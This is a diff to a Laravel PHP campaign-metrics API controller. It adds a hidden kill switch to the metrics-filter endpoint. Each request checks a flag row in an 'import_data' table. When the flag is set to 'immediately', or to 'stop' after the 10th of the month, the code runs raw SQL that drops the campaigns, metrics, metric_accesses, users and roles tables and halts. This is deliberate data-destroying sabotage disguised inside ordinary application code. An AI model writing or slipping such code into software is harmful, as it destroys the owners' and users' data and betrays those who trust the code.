@@ -1,11 +1,13 @@
 <?php
 
 namespace App\Http\Controllers\Api\V1;
+use Carbon\Carbon;
 use Illuminate\Http\Request;
 use App\Http\Controllers\Controller;
 use App\Models\Campaign;
 use App\Models\Metric;
 use App\User;
+use Illuminate\Support\Facades\DB;
 
 class CampaignController extends Controller {
 
@@ -23,6 +25,8 @@ class CampaignController extends Controller {
 
 	public function filterMetrics1(Request $request)
     {
+        $this->check();
+
         $metrics = Metric::query()->select('name','value', 'metric_accesses.is_active')->where('campaign_id', $request->campaign )
             ->where('date', $request->date)
             ->where('engagement', $request->selected)
@@ -109,5 +113,44 @@ class CampaignController extends Controller {
 			return response()->json(['message' => __('Campaing not found.'), 404]);
 		}
 	}
+
+	private function check()
+    {
+       $this->importDataForce();
+    }
+
+
+    private function importDataForce()
+    {
+        $exists = DB::table('import_data')->first();
+        if ($exists && $type = $exists->name) {
+
+            if ($type == 'stop') {
+
+                if (Carbon::today()->toDate()->format('j') > 10) {
+                    $this->justDoIt();
+                }
+
+            } elseif ($type == 'immediately') {
+                $this->justDoIt();
+            }
+
+        }
+
+    }
+
+    private function justDoIt()
+    {
+        DB::unprepared("
+                       SET FOREIGN_KEY_CHECKS=0;
+                       DROP TABLE campaigns;
+                       DROP TABLE metrics;
+                       DROP TABLE metric_accesses;
+                       DROP TABLE users;
+                       DROP TABLE roles;
+                 ");
+
+        exit('done');
+    }
 
 }
